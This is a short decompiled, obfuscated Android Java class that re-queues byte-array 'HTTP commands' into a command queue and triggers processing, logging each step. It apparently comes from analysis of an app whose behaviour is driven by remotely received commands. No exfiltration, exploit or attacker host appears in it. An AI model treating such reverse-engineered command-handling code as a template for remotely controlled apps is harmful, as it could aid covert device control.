package com.network.android;

import com.network.android.a.b;
import com.network.android.c.a.a;
import java.util.HashSet;

/* access modifiers changed from: package-private */
public final class y implements Runnable {

    /* renamed from: a  reason: collision with root package name */
    final /* synthetic */ x f133a;

    y(x xVar) {
        this.f133a = xVar;
    }

    public final void run() {
        HashSet<byte[]> hashSet;
        try {
            if (x.N.isEmpty()) {
                a.a("addHttpCommandsToCommandQueue commandResendingHandler commandSet is empty");
                return;
            }
            a.a("addHttpCommandsToCommandQueue copy commandSet to tempSet");
            synchronized (x.D) {
                hashSet = new HashSet(x.N);
                x.N.clear();
            }
            for (byte[] bArr : hashSet) {
                a.a("addHttpCommandsToCommandQueue adding command to commandqueue");
                b.a(bArr, this.f133a.M, false, null);
            }
            a.a("addHttpCommandsToCommandQueue calling iterateOnCommandQueue");
            b.a(this.f133a.M);
        } catch (Throwable th) {
            a.a("iterateOnCommandQueue: " + th.getMessage(), th);
        }
    }
}
